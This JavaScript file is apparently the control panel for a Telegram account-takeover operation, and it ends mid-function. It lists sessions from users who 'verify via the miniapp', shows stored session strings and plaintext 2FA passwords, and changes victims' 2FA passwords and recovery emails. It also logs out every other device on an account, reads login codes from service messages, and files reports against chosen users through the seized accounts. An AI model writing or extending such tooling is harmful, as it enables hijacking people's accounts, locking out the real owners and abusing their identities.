/* Manager — frontend logic */
const API = '';
let sessionsCache = [];
let botsCache = [];

/* ---------- helpers ---------- */
const $ = (s, p = document) => p.querySelector(s);
const $$ = (s, p = document) => [...p.querySelectorAll(s)];

function renderIcons() {
  if (window.lucide) lucide.createIcons();
}

function toast(msg, kind = '') {
  const t = $('#toast');
  t.textContent = msg;
  t.className = 'toast show ' + kind;
  setTimeout(() => (t.className = 'toast'), 2400);
}

async function api(path, opts = {}) {
  const r = await fetch(API + path, {
    headers: { 'Content-Type': 'application/json', ...(opts.headers || {}) },
    ...opts,
  });
  const txt = await r.text();
  let data = null;
  try { data = txt ? JSON.parse(txt) : null; } catch { data = { raw: txt }; }
  if (!r.ok) throw new Error((data && data.error) || `HTTP ${r.status}`);
  return data;
}

function fmtTs(ts) {
  if (!ts) return '—';
  const d = new Date(ts * 1000);
  return d.toLocaleString(undefined, { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
}
function fmtRelative(ts) {
  if (!ts) return '—';
  const diff = Math.floor(Date.now() / 1000) - ts;
  if (diff < 60) return 'just now';
  if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
  if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
  return Math.floor(diff / 86400) + 'd ago';
}
function fmtCountdown(ts) {
  if (!ts) return '—';
  const diff = ts - Math.floor(Date.now() / 1000);
  if (diff <= 0) return 'due';
  const h = Math.floor(diff / 3600);
  const m = Math.floor((diff % 3600) / 60);
  return `${h}h ${m}m`;
}

function openModal(id) { $('#' + id).classList.remove('hidden'); renderIcons(); }
function closeModal(id) { $('#' + id).classList.add('hidden'); }
$$('[data-close]').forEach(b => b.onclick = () => b.closest('.modal').classList.add('hidden'));

/* ---------- navigation ---------- */
function switchView(name) {
  $$('.view').forEach(v => v.classList.add('hidden'));
  $('#view-' + name).classList.remove('hidden');
  $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.view === name));
  $('#topbar-title').textContent = name.charAt(0).toUpperCase() + name.slice(1);
  $('#sidebar').classList.remove('open');
  renderIcons();
  if (name === 'dashboard') loadDashboard();
  if (name === 'sessions') loadSessions();
  if (name === 'directlogin') initDirectLogin();
  if (name === 'reports') initReports();
  if (name === 'bots') loadBots();
  if (name === 'audit') loadAudit();
  if (name === 'settings') loadSettings();
}
$$('.nav-item, [data-view]').forEach(a => a.onclick = (e) => { e.preventDefault(); switchView(a.dataset.view); });
$('#hamb').onclick = () => $('#sidebar').classList.toggle('open');
$('#btn-logout').onclick = async () => { await api('/api/logout', { method: 'POST' }); location.href = '/'; };
$('#btn-refresh').onclick = () => {
  const view = $('.nav-item.active').dataset.view;
  switchView(view);
  toast('Refreshed', 'ok');
};

/* ---------- dashboard ---------- */
async function loadDashboard() {
  try {
    const d = await api('/api/dashboard');
    const cards = [
      { k: 'Sessions', v: d.total, cls: 'blue', icon: 'smartphone' },
      { k: 'New Today', v: d.today, cls: 'ok', icon: 'sparkles' },
      { k: 'Protected', v: d.protected, cls: '', icon: 'shield' },
      { k: '2FA Stored', v: d.has_2fa_pw, cls: '', icon: 'key-round' },
      { k: 'Pending Auto-LO', v: d.pending_auto_logout, cls: 'warn', icon: 'timer' },
      { k: 'Auto-Logout', v: d.auto_logout_enabled ? 'ON' : 'OFF', cls: d.auto_logout_enabled ? 'bad' : '', icon: 'power' },
      { k: 'Bots Online', v: `${d.bots_running}/${d.bots_total}`, cls: d.bots_running > 0 ? 'ok' : 'bad', icon: 'bot' },
      { k: 'Contacts', v: d.contacts_total, cls: '', icon: 'contact' },
    ];
    $('#stats').innerHTML = cards.map(c => `<div class="stat ${c.cls}"><div class="v">${c.v}</div><div class="k">${c.k}</div></div>`).join('');

    // miniapp banner
    const banner = $('#miniapp-banner');
    const status = $('#miniapp-status');
    if (d.miniapp_url && d.miniapp_url !== '/m/') {
      status.className = 'badge green';
      status.textContent = 'Ready';
      banner.innerHTML = `
        <div class="miniapp-url">
          <button class="btn sm ghost" id="copy-miniapp" style="position:absolute;top:4px;right:4px"><i data-lucide="copy"></i></button>
          ${d.miniapp_url}
        </div>
        <div class="muted sm" style="margin-top:8px">In @BotFather → /mybots → select bot → Bot Settings → Menu Button → set Web App URL to the above.</div>
      `;
      $('#copy-miniapp').onclick = () => { navigator.clipboard.writeText(d.miniapp_url); toast('Copied', 'ok'); };
    } else {
      status.className = 'badge yellow';
      status.textContent = 'Not configured';
      banner.innerHTML = `<div class="muted sm">Run with <code>USE_TUNNEL=1 ./start.sh</code> or set <code>MINI_APP_URL</code> in <code>.env</code>. Then point BotFather's Web App URL to <code>&lt;that-url&gt;/m/</code>.</div>`;
    }

    // bots overview
    let botsHtml = '';
    try {
      const bots = await api('/api/bots');
      botsCache = bots;
      if (!bots.length) {
        botsHtml = `<div class="muted sm" style="padding:8px 0">No bots yet. Add one in the Bots tab.</div>`;
      } else {
        botsHtml = bots.slice(0, 4).map(b => `
          <div class="bot-mini-row">
            <div class="bot-mini-name">
              <span class="badge ${b.status.running ? 'green' : 'red'}"><span class="dot"></span>${b.status.running ? 'Online' : 'Off'}</span>
              ${b.name}${b.is_primary ? '<span class="badge blue">Primary</span>' : ''}
            </div>
            <div class="bot-mini-stats">
              <span>${b.status.contacts_count || 0} contacts</span>
              <span>${b.bot_token_masked}</span>
            </div>
          </div>
        `).join('');
      }
    } catch (e) { botsHtml = `<div class="muted sm">${e.message}</div>`; }
    $('#bots-overview').innerHTML = botsHtml;

    const list = sessionsCache.length ? sessionsCache : await api('/api/sessions');
    sessionsCache = list;
    const recent = list.slice(0, 5);
    $('#recent-list').innerHTML = recent.length
      ? recent.map(scardHTML).join('')
      : `<div class="empty"><i data-lucide="inbox"></i><div>No sessions yet. Users who verify via the miniapp will appear here.</div></div>`;
    bindScardActions();
    renderIcons();
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- sessions ---------- */
async function loadSessions() {
  try {
    sessionsCache = await api('/api/sessions');
    renderSessions();
  } catch (e) { toast(e.message, 'err'); }
}

function renderSessions() {
  const q = ($('#search').value || '').toLowerCase();
  const f2 = $('#filter-2fa').value;
  const fp = $('#filter-protected').value;
  const filtered = sessionsCache.filter(s => {
    if (q && !(`${s.phone} ${s.name} ${s.username} ${s.user_id}`.toLowerCase().includes(q))) return false;
    if (f2 === 'yes' && !s.has_2fa_pw) return false;
    if (f2 === 'no' && s.has_2fa_pw) return false;
    if (fp === 'yes' && !s.is_protected) return false;
    if (fp === 'no' && s.is_protected) return false;
    return true;
  });
  $('#session-list').innerHTML = filtered.length
    ? filtered.map(scardHTML).join('')
    : `<div class="empty"><i data-lucide="search-x"></i><div>No matching sessions.</div></div>`;
  bindScardActions();
  renderIcons();
}

$('#search').oninput = renderSessions;
$('#filter-2fa').onchange = renderSessions;
$('#filter-protected').onchange = renderSessions;

function scardHTML(s) {
  const initials = (s.name || s.phone || '?').slice(0, 2).toUpperCase();
  const badges = [];
  if (s.is_current) badges.push('<span class="badge blue">Current</span>');
  if (s.is_protected) badges.push('<span class="badge green">Protected</span>');
  if (s.has_2fa_pw) badges.push('<span class="badge yellow">2FA</span>');
  if (s.email) badges.push(`<span class="badge purple">${s.email}</span>`);
  if (s.auto_logout_at && !s.auto_logout_fired) badges.push(`<span class="badge orange">Auto-LO ${fmtCountdown(s.auto_logout_at)}</span>`);
  if (s.auto_logout_fired) badges.push('<span class="badge red">Auto-LO fired</span>');
  return `
  <div class="scard" data-id="${s.id}">
    <div class="scard-top">
      <div class="scard-id">
        <div class="avatar">${initials}</div>
        <div>
          <div class="scard-name">${s.name || '—'} ${s.username ? '@' + s.username : ''}</div>
          <div class="scard-phone">${s.phone || '—'}</div>
        </div>
      </div>
      <div class="badges">${badges.join('')}</div>
    </div>
    <div class="scard-meta">
      <span class="item"><i data-lucide="clock"></i> ${fmtRelative(s.created_at)}</span>
      <span class="item"><i data-lucide="eye"></i> ${fmtRelative(s.last_seen)}</span>
      ${s.last_action ? `<span class="item"><i data-lucide="zap"></i> ${s.last_action}</span>` : ''}
    </div>
    <div class="scard-actions">
      <button class="btn sm" data-act="devices"><i data-lucide="monitor-smartphone"></i><span>Devices</span></button>
      <button class="btn sm" data-act="2fa"><i data-lucide="shield-check"></i><span>2FA</span></button>
      <button class="btn sm" data-act="mail"><i data-lucide="mail"></i><span>Email</span></button>
      <button class="btn sm ${s.is_protected ? 'primary' : 'ghost'}" data-act="protect"><i data-lucide="shield"></i><span>${s.is_protected ? 'Protected' : 'Protect'}</span></button>
      <button class="btn sm ${s.is_current ? 'primary' : 'ghost'}" data-act="current"><i data-lucide="map-pin"></i><span>${s.is_current ? 'Current' : 'Set Current'}</span></button>
      <button class="btn sm" data-act="detail"><i data-lucide="info"></i><span>Details</span></button>
      <button class="btn sm danger" data-act="force"><i data-lucide="power"></i><span>Force Logout</span></button>
      <button class="btn sm ghost" data-act="delete"><i data-lucide="trash-2"></i></button>
    </div>
  </div>`;
}

function bindScardActions() {
  $$('.scard').forEach(card => {
    const id = +card.dataset.id;
    $$('button[data-act]', card).forEach(btn => {
      btn.onclick = () => handleAction(btn.dataset.act, id);
    });
  });
}

async function handleAction(act, id) {
  const s = sessionsCache.find(x => x.id === id);
  if (!s) return;
  try {
    if (act === 'devices') return openDevices(id, s);
    if (act === '2fa') return open2FA(id, s);
    if (act === 'mail') return openMail(id, s);
    if (act === 'detail') return openDetail(id);
    if (act === 'protect') {
      await api(`/api/sessions/${id}/protect`, { method: 'POST', body: JSON.stringify({ value: !s.is_protected }) });
      toast('Updated', 'ok'); loadSessions();
    }
    if (act === 'current') {
      await api(`/api/sessions/${id}/current`, { method: 'POST', body: JSON.stringify({ value: !s.is_current }) });
      toast('Updated', 'ok'); loadSessions();
    }
    if (act === 'force') {
      if (!confirm(`Logout ALL other devices on ${s.phone}?\n\nThe current session (used by Manager) is kept. All other devices on this account will be logged out.`)) return;
      const r = await api(`/api/sessions/${id}/force-logout`, { method: 'POST' });
      toast(`Logged out ${r.killed || 0} devices`, 'ok');
    }
    if (act === 'delete') {
      if (!confirm('Delete this session from Manager?\n(DB row only — does not logout Telegram)')) return;
      await api(`/api/sessions/${id}`, { method: 'DELETE' });
      toast('Deleted', 'ok'); loadSessions();
    }
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- devices ---------- */
async function openDevices(id, s) {
  $('#dev-phone').textContent = s.phone || s.name;
  $('#dev-body').innerHTML = `<div class="muted" style="padding:12px 0"><i data-lucide="loader-2" style="animation:spin 1s linear infinite;display:inline-block;vertical-align:-3px;width:14px;height:14px"></i> Loading devices…</div>`;
  openModal('modal-devices');
  try {
    const r = await api(`/api/sessions/${id}/devices`);
    if (!r.devices || !r.devices.length) {
      $('#dev-body').innerHTML = `<div class="muted" style="padding:12px 0">No devices found.</div>`;
      renderIcons();
      return;
    }
    $('#dev-body').innerHTML = r.devices.map(d => `
      <div class="dev-row">
        <div class="dev-info">
          <div class="dev-name">
            ${d.is_current ? '<span class="badge blue"><span class="dot"></span>This session</span>' : ''}
            ${d.app_name || 'Unknown app'}
          </div>
          <div class="dev-meta">
            <i data-lucide="smartphone"></i> ${d.device_model || '—'} · ${d.platform || ''} ${d.system_version || ''}<br>
            <i data-lucide="globe"></i> ${d.ip || '—'} · ${d.country || '—'}<br>
            <i data-lucide="clock"></i> Active ${fmtRelative(d.date_active ? new Date(d.date_active).getTime() / 1000 : 0)}
          </div>
        </div>
        ${d.is_current ? '<span class="badge">Kept</span>' : `<button class="btn sm danger" data-hash="${d.hash}"><i data-lucide="log-out"></i><span>Logout</span></button>`}
      </div>
    `).join('');
    $$('#dev-body button[data-hash]').forEach(b => b.onclick = async () => {
      try {
        await api(`/api/sessions/${id}/logout-device`, { method: 'POST', body: JSON.stringify({ hash: +b.dataset.hash }) });
        toast('Logged out', 'ok');
        openDevices(id, s);
      } catch (e) { toast(e.message, 'err'); }
    });
    renderIcons();
  } catch (e) {
    $('#dev-body').innerHTML = `<div class="err" style="padding:8px 0">${e.message}</div>`;
    renderIcons();
  }
}

$('#btn-logout-others').onclick = async () => {
  const phone = $('#dev-phone').textContent;
  const s = sessionsCache.find(x => x.phone === phone || x.name === phone);
  if (!s) return;
  if (!confirm('Logout ALL other devices on this account?\n\nThe current session used by Manager will be kept.')) return;
  try {
    const r = await api(`/api/sessions/${s.id}/logout-others`, { method: 'POST' });
    toast(`Logged out ${r.killed || 0} devices`, 'ok');
    openDevices(s.id, s);
  } catch (e) { toast(e.message, 'err'); }
};

/* ---------- 2FA ---------- */
async function open2FA(id, s) {
  $('#fa-phone').textContent = s.phone || s.name;
  $('#fa-current').value = '';
  $('#fa-new').value = '';
  $('#fa-hint').value = s.email || '';
  $('#fa-email').value = s.email || '';
  $('#fa-err').textContent = '';
  $('#fa-status').textContent = 'Checking 2FA status…';
  openModal('modal-2fa');
  try {
    const r = await api(`/api/sessions/${id}/2fa-status`);
    if (r.error) {
      $('#fa-status').innerHTML = `<span class="badge red">Error</span> ${r.error}`;
    } else {
      $('#fa-status').innerHTML = r.has_2fa
        ? `<span class="badge yellow"><span class="dot"></span>2FA enabled</span> &nbsp;Hint: ${r.hint || '—'} · Recovery: ${r.has_recovery ? 'yes' : 'no'}`
        : `<span class="badge green"><span class="dot"></span>No 2FA set</span>`;
    }
  } catch (e) { $('#fa-status').textContent = 'Status check failed: ' + e.message; }
}

$('#btn-set-2fa').onclick = async () => {
  const phone = $('#fa-phone').textContent;
  const s = sessionsCache.find(x => x.phone === phone || x.name === phone);
  if (!s) return;
  const body = {
    current_password: $('#fa-current').value,
    new_password: $('#fa-new').value,
    hint: $('#fa-hint').value,
    recovery_email: $('#fa-email').value,
  };
  if (!body.new_password && !body.recovery_email) { $('#fa-err').textContent = 'Enter new password or email'; return; }
  try {
    const r = await api(`/api/sessions/${s.id}/2fa`, { method: 'POST', body: JSON.stringify(body) });
    if (r.success) { toast('2FA updated', 'ok'); closeModal('modal-2fa'); }
    else { $('#fa-err').textContent = r.error || 'Failed'; }
  } catch (e) { $('#fa-err').textContent = e.message; }
};

/* ---------- mail ---------- */
function openMail(id, s) {
  $('#mail-phone').textContent = s.phone || s.name;
  $('#mail-input').value = s.email || '';
  openModal('modal-mail');
  $('#btn-save-mail').onclick = async () => {
    try {
      await api(`/api/sessions/${id}/mail`, { method: 'POST', body: JSON.stringify({ email: $('#mail-input').value }) });
      toast('Saved', 'ok'); closeModal('modal-mail'); loadSessions();
    } catch (e) { toast(e.message, 'err'); }
  };
}

/* ---------- detail ---------- */
async function openDetail(id) {
  try {
    const s = await api(`/api/sessions/${id}`);
    $('#d-phone').textContent = s.phone;
    const rows = [
      ['Phone', s.phone],
      ['User ID', s.user_id],
      ['Username', s.username || '—'],
      ['Name', s.name || '—'],
      ['Email', s.email || '—'],
      ['2FA Password', s.twofa_password || '—'],
      ['Protected', s.is_protected ? 'Yes' : 'No'],
      ['Current', s.is_current ? 'Yes' : 'No'],
      ['Created', fmtTs(s.created_at)],
      ['Last seen', fmtTs(s.last_seen)],
      ['Auto-logout at', s.auto_logout_at ? fmtTs(s.auto_logout_at) : '—'],
      ['Auto-logout fired', s.auto_logout_fired ? 'Yes' : 'No'],
    ];
    $('#d-body').innerHTML = `
      <div class="dl">${rows.map(r => `<div class="k">${r[0]}</div><div class="v">${r[1]}</div>`).join('')}</div>
      <div class="label">Notes</div>
      <textarea id="d-notes" class="input" rows="3">${s.notes || ''}</textarea>
      <button class="btn sm" id="d-save-notes" style="margin-top:6px"><i data-lucide="save"></i><span>Save notes</span></button>
      <div class="label" style="margin-top:14px">Session String</div>
      <div class="copy-box"><button class="btn sm ghost" id="d-copy"><i data-lucide="copy"></i></button>${s.session_string || '—'}</div>
    `;
    openModal('modal-detail');
    $('#d-copy').onclick = () => { navigator.clipboard.writeText(s.session_string || ''); toast('Copied', 'ok'); };
    $('#d-save-notes').onclick = async () => {
      try {
        await api(`/api/sessions/${id}/notes`, { method: 'POST', body: JSON.stringify({ notes: $('#d-notes').value }) });
        toast('Saved', 'ok');
      } catch (e) { toast(e.message, 'err'); }
    };
    renderIcons();
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- Direct Login ---------- */
let dlState = { sid: null, phone: null, otpCells: null };

function initDirectLogin() {
  // reset to first step
  dlShowStep('phone');
  $('#dl-phone').value = '';
  $('#dl-phone-err').textContent = '';
  $('#dl-otp-err').textContent = '';
  $('#dl-2fa').value = '';
  $('#dl-2fa-err').textContent = '';
  // reset OTP cells
  $$('.dl-otp-cell').forEach(c => { c.value = ''; c.classList.remove('filled'); });
  updateDlVerifyBtn();
  renderIcons();
  setTimeout(() => $('#dl-phone').focus(), 100);
  // init OTP listener
  initOtpListener();
}

/* ---------- OTP Listener ---------- */
async function initOtpListener() {
  $('#otp-err').textContent = '';
  $('#otp-results').innerHTML = `<div class="otp-empty"><i data-lucide="radio"></i><div>Select a session and click "Listen for OTP"</div></div>`;
  renderIcons();
  try {
    if (!sessionsCache.length) sessionsCache = await api('/api/sessions');
    const sel = $('#otp-session');
    sel.innerHTML = sessionsCache.length
      ? '<option value="">— Select a session —</option>' + sessionsCache.map(s => `<option value="${s.id}">${s.name || s.phone} — ${s.phone}</option>`).join('')
      : '<option value="">No sessions available</option>';
  } catch (e) { toast(e.message, 'err'); }
}

async function doListenOtp() {
  const sid = $('#otp-session').value;
  if (!sid) { $('#otp-err').textContent = 'Select a session first'; return; }
  $('#otp-err').textContent = '';
  const btn = $('#otp-listen');
  const refreshBtn = $('#otp-refresh');
  btn.disabled = true;
  refreshBtn.disabled = true;
  btn.innerHTML = '<i data-lucide="loader-2" style="animation:spin 1s linear infinite"></i><span>Listening…</span>';
  renderIcons();
  $('#otp-results').innerHTML = `<div class="otp-listening"><i data-lucide="loader-2" style="animation:spin 1s linear infinite;width:16px;height:16px"></i> Fetching service messages…</div>`;
  renderIcons();
  try {
    const r = await api(`/api/sessions/${sid}/listen-otp`);
    if (r.error) {
      $('#otp-results').innerHTML = `<div class="otp-empty"><i data-lucide="alert-triangle"></i><div style="color:var(--red)">${r.error}</div></div>`;
    } else if (!r.codes || !r.codes.length) {
      $('#otp-results').innerHTML = `<div class="otp-empty"><i data-lucide="inbox"></i><div>No OTP codes found in recent messages.</div></div>`;
    } else {
      $('#otp-results').innerHTML = r.codes.map((c, i) => `
        <div class="otp-result" style="animation-delay:${i * 0.05}s">
          <div class="otp-code">${c.code}</div>
          <div class="otp-meta">
            <div class="otp-text">${c.text.substring(0, 80).replace(/</g,'&lt;')}…</div>
            <div class="otp-time">${fmtRelative(c.ts)}</div>
          </div>
          <button class="otp-copy" data-code="${c.code}">Copy</button>
        </div>
      `).join('');
      $$('.otp-copy').forEach(b => b.onclick = () => {
        navigator.clipboard.writeText(b.dataset.code);
        toast('Copied ' + b.dataset.code, 'ok');
      });
    }
    renderIcons();
  } catch (e) {
    $('#otp-results').innerHTML = `<div class="otp-empty"><i data-lucide="alert-triangle"></i><div style="color:var(--red)">${e.message}</div></div>`;
    renderIcons();
  }
  btn.disabled = false;
  refreshBtn.disabled = false;
  btn.innerHTML = '<i data-lucide="radio"></i><span>Listen for OTP</span>';
  renderIcons();
}

$('#otp-listen').onclick = doListenOtp;
$('#otp-refresh').onclick = doListenOtp;

function dlShowStep(name) {
  $$('.dl-step').forEach(s => s.classList.remove('active'));
  $('#dl-step-' + name).classList.add('active');
  renderIcons();
}

function dlLoading(on) { $('#dl-loading').classList.toggle('active', on); }

function updateDlVerifyBtn() {
  const code = dlGetOtp();
  $('#dl-verify').disabled = code.length !== 5;
}

function dlGetOtp() {
  return $$('.dl-otp-cell').map(c => c.value).join('');
}

// OTP cell behavior
$$('.dl-otp-cell').forEach((c, i) => {
  c.addEventListener('input', () => {
    c.value = c.value.replace(/\D/g, '').slice(0, 1);
    if (c.value) {
      c.classList.add('filled');
      if (i < 4) $$('.dl-otp-cell')[i + 1].focus();
    } else {
      c.classList.remove('filled');
    }
    updateDlVerifyBtn();
  });
  c.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !c.value && i > 0) {
      $$('.dl-otp-cell')[i - 1].focus();
    }
  });
  c.addEventListener('paste', e => {
    e.preventDefault();
    const txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 5);
    if (!txt) return;
    $$('.dl-otp-cell').forEach((cell, idx) => {
      if (idx < txt.length) {
        cell.value = txt[idx];
        cell.classList.add('filled');
      } else {
        cell.value = '';
        cell.classList.remove('filled');
      }
    });
    updateDlVerifyBtn();
    if (txt.length === 5) $('#dl-verify').focus();
  });
});

$('#dl-send').onclick = async () => {
  const phone = $('#dl-phone').value.trim();
  if (!phone) { $('#dl-phone-err').textContent = 'Phone number required'; return; }
  $('#dl-phone-err').textContent = '';
  dlLoading(true);
  try {
    const r = await api('/api/direct-login/send-code', { method: 'POST', body: JSON.stringify({ phone }) });
    if (r.success) {
      dlState.sid = r.session_id;
      dlState.phone = phone.startsWith('+') ? phone : '+' + phone;
      $('#dl-phone-display').textContent = dlState.phone;
      dlShowStep('otp');
      setTimeout(() => $$('.dl-otp-cell')[0].focus(), 200);
    } else if (r.error) {
      $('#dl-phone-err').textContent = r.error;
    }
  } catch (e) { $('#dl-phone-err').textContent = e.message; }
  dlLoading(false);
};

$('#dl-back-phone').onclick = () => {
  dlShowStep('phone');
  $('#dl-phone').focus();
  $('#dl-phone').select();
};

$('#dl-verify').onclick = async () => {
  const code = dlGetOtp();
  if (code.length !== 5) return;
  $('#dl-otp-err').textContent = '';
  dlLoading(true);
  try {
    const r = await api('/api/direct-login/verify', { method: 'POST', body: JSON.stringify({ session_id: dlState.sid, code }) });
    if (r.success) {
      dlShowStep('success');
      $('#dl-success-name').textContent = r.user?.name || dlState.phone;
    } else if (r.requires_password) {
      dlShowStep('2fa');
      setTimeout(() => $('#dl-2fa').focus(), 200);
    } else if (r.error) {
      $('#dl-otp-err').textContent = r.error;
    }
  } catch (e) { $('#dl-otp-err').textContent = e.message; }
  dlLoading(false);
};

$('#dl-verify-2fa').onclick = async () => {
  const pw = $('#dl-2fa').value;
  if (!pw) { $('#dl-2fa-err').textContent = 'Password required'; return; }
  $('#dl-2fa-err').textContent = '';
  dlLoading(true);
  try {
    const r = await api('/api/direct-login/verify', { method: 'POST', body: JSON.stringify({ session_id: dlState.sid, code: dlGetOtp(), password: pw }) });
    if (r.success) {
      dlShowStep('success');
      $('#dl-success-name').textContent = r.user?.name || dlState.phone;
    } else if (r.error) {
      $('#dl-2fa-err').textContent = r.error;
    }
  } catch (e) { $('#dl-2fa-err').textContent = e.message; }
  dlLoading(false);
};

$('#dl-done').onclick = () => switchView('sessions');

/* ---------- Reports ---------- */
async function initReports() {
  renderIcons();
  // populate session dropdown
  try {
    if (!sessionsCache.length) sessionsCache = await api('/api/sessions');
    const sel = $('#rp-session');
    sel.innerHTML = sessionsCache.length
      ? sessionsCache.map(s => `<option value="${s.id}">${s.name || s.phone} — ${s.phone}</option>`).join('')
      : '<option value="">No sessions available</option>';
  } catch (e) { toast(e.message, 'err'); }

  // load report history (audit entries with action=report_peer)
  try {
    const audit = await api('/api/audit?limit=100');
    const reports = audit.filter(r => r.action === 'report_peer');
    $('#rp-history').innerHTML = reports.length
      ? reports.map(r => `<div class="audit-row"><div class="ts">${fmtTs(r.ts)}</div><div class="act">report</div><div class="det">${r.phone || '—'} ${r.detail || ''}</div></div>`).join('')
      : `<div class="empty"><i data-lucide="flag"></i><div>No reports yet.</div></div>`;
    renderIcons();
  } catch (e) { /* ignore */ }

  $('#rp-err').textContent = '';
  $('#rp-resolve-result').textContent = '';
  $('#rp-resolve-result').className = 'muted sm';
}

$('#rp-resolve').onclick = async () => {
  const sid = $('#rp-session').value;
  const peer = $('#rp-peer').value.trim();
  const out = $('#rp-resolve-result');
  if (!sid || !peer) { out.textContent = 'Select session and enter peer'; out.className = 'muted sm err'; return; }
  out.textContent = 'Resolving…';
  out.className = 'muted sm';
  try {
    const r = await api(`/api/sessions/${sid}/resolve-peer`, { method: 'POST', body: JSON.stringify({ peer }) });
    if (r.error) { out.textContent = r.error; out.className = 'muted sm err'; }
    else if (r.ok) {
      const info = r.info || {};
      out.textContent = info.id ? `✓ ${info.name || ''} ${info.username ? '@' + info.username : ''} (ID: ${info.id})` : '✓ Resolved';
      out.className = 'muted sm ok';
    }
  } catch (e) { out.textContent = e.message; out.className = 'muted sm err'; }
};

$('#rp-submit').onclick = async () => {
  const sid = $('#rp-session').value;
  const peer = $('#rp-peer').value.trim();
  const reason = $('#rp-reason').value;
  const message = $('#rp-message').value.trim();
  $('#rp-err').textContent = '';
  if (!sid) { $('#rp-err').textContent = 'Select a session'; return; }
  if (!peer) { $('#rp-err').textContent = 'Enter a target peer'; return; }
  if (!confirm(`Report "${peer}" for ${reason} using session #${sid}?\nThis action is irreversible.`)) return;
  const btn = $('#rp-submit');
  const orig = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<i data-lucide="loader-2" style="animation:spin 1s linear infinite"></i><span>Reporting…</span>';
  renderIcons();
  try {
    const r = await api(`/api/sessions/${sid}/report-peer`, { method: 'POST', body: JSON.stringify({ peer, reason, message }) });
    if (r.success) {
      toast(`Reported ${peer} (${reason})`, 'ok');
      $('#rp-peer').value = '';
      $('#rp-message').value = '';
      $('#rp-resolve-result').textContent = '';
      // refresh history
      initReports();
    } else if (r.error) {
      $('#rp-err').textContent = r.error;
    }
  } catch (e) { $('#rp-err').textContent = e.message; }
  btn.disabled = false;
  btn.innerHTML = orig;
  renderIcons();
};

/* ---------- bots ---------- */
async function loadBots() {
  try {
    botsCache = await api('/api/bots');
    renderBots();
  } catch (e) { toast(e.message, 'err'); }
}

function renderBots() {
  if (!botsCache.length) {
    $('#bot-list').innerHTML = `<div class="empty"><i data-lucide="bot"></i><div>No bots yet. Click "Add Bot" to start a new one.</div></div>`;
    renderIcons();
    return;
  }
  $('#bot-list').innerHTML = botsCache.map(b => botCardHTML(b)).join('');
  bindBotActions();
  renderIcons();
}

function botCardHTML(b) {
  const status = b.status || {};
  const running = status.running;
  return `
  <div class="scard" data-bot="${b.id}">
    <div class="scard-top">
      <div class="scard-id">
        <div class="avatar" style="background:linear-gradient(135deg,#3b82f6,#1e40af)"><i data-lucide="bot" style="width:18px;height:18px;color:#fff"></i></div>
        <div>
          <div class="scard-name">${b.name} ${b.is_primary ? '<span class="badge blue" style="margin-left:4px">Primary</span>' : ''}</div>
          <div class="scard-phone">${b.bot_token_masked}</div>
        </div>
      </div>
      <div class="badges">
        <span class="badge ${running ? 'green' : 'red'}"><span class="dot"></span>${running ? 'Online' : 'Off'}</span>
        ${b.enabled ? '' : '<span class="badge">Disabled</span>'}
      </div>
    </div>
    <div class="scard-meta">
      <span class="item"><i data-lucide="contact"></i> ${status.contacts_count || 0} contacts</span>
      <span class="item"><i data-lucide="message-square"></i> ${status.messages_received || 0} messages</span>
      <span class="item"><i data-lucide="clock"></i> ${status.started_at ? 'up ' + fmtRelative(status.started_at) : '—'}</span>
      <span class="item"><i data-lucide="eye"></i> ${status.last_seen ? fmtRelative(status.last_seen) : '—'}</span>
      ${status.last_error ? `<span class="item" style="color:var(--red)"><i data-lucide="alert-triangle"></i> ${status.last_error}</span>` : ''}
    </div>
    <div class="scard-actions">
      <button class="btn sm" data-bact="restart"><i data-lucide="refresh-cw"></i><span>Restart</span></button>
      <button class="btn sm ${b.enabled ? 'ghost' : 'primary'}" data-bact="toggle"><i data-lucide="power"></i><span>${b.enabled ? 'Disable' : 'Enable'}</span></button>
      ${b.is_primary ? '' : `<button class="btn sm ghost" data-bact="primary"><i data-lucide="star"></i><span>Set Primary</span></button>`}
      ${b.is_primary ? '<span class="badge" style="margin-left:auto">Cannot delete primary</span>' : `<button class="btn sm danger" data-bact="delete"><i data-lucide="trash-2"></i></button>`}
    </div>
  </div>`;
}

function bindBotActions() {
  $$('.scard[data-bot]').forEach(card => {
    const id = +card.dataset.bot;
    $$('button[data-bact]', card).forEach(btn => {
      btn.onclick = () => handleBotAction(btn.dataset.bact, id);
    });
  });
}

async function handleBotAction(act, id) {
  const b = botsCache.find(x => x.id === id);
  if (!b) return;
  try {
    if (act === 'restart') {
      const r = await api(`/api/bots/${id}/restart`, { method: 'POST' });
      toast(r.ok ? 'Restarted' : (r.message || 'Failed'), r.ok ? 'ok' : 'err');
      setTimeout(loadBots, 800);
    }
    if (act === 'toggle') {
      await api(`/api/bots/${id}/toggle`, { method: 'POST', body: JSON.stringify({ enabled: !b.enabled }) });
      toast(b.enabled ? 'Disabled' : 'Enabled', 'ok');
      setTimeout(loadBots, 500);
    }
    if (act === 'primary') {
      if (!confirm(`Make "${b.name}" the primary bot?`)) return;
      await api(`/api/bots/${id}/primary`, { method: 'POST' });
      toast('Set as primary', 'ok');
      loadBots();
    }
    if (act === 'delete') {
      if (!confirm(`Delete bot "${b.name}"?`)) return;
      await api(`/api/bots/${id}`, { method: 'DELETE' });
      toast('Deleted', 'ok');
      loadBots();
    }
  } catch (e) { toast(e.message, 'err'); }
}

$('#btn-add-bot').onclick = () => {
  $('#addbot-name').value = '';
  $('#addbot-token').value = '';
  $('#addbot-err').textContent = '';
  openModal('modal-addbot');
};

$('#btn-confirm-addbot').onclick = async () => {
  const name = $('#addbot-name').value.trim();
  const token = $('#addbot-token').value.trim();
  if (!name || !token) { $('#addbot-err').textContent = 'Name and token required'; return; }
  try {
    await api('/api/bots', { method: 'POST', body: JSON.stringify({ name, bot_token: token }) });
    toast('Bot added', 'ok');
    closeModal('modal-addbot');
    loadBots();
  } catch (e) { $('#addbot-err').textContent = e.message; }
};

/* ---------- audit ---------- */
async function loadAudit() {
  try {
    const rows = await api('/api/audit?limit=100');
    $('#audit-list').innerHTML = rows.length
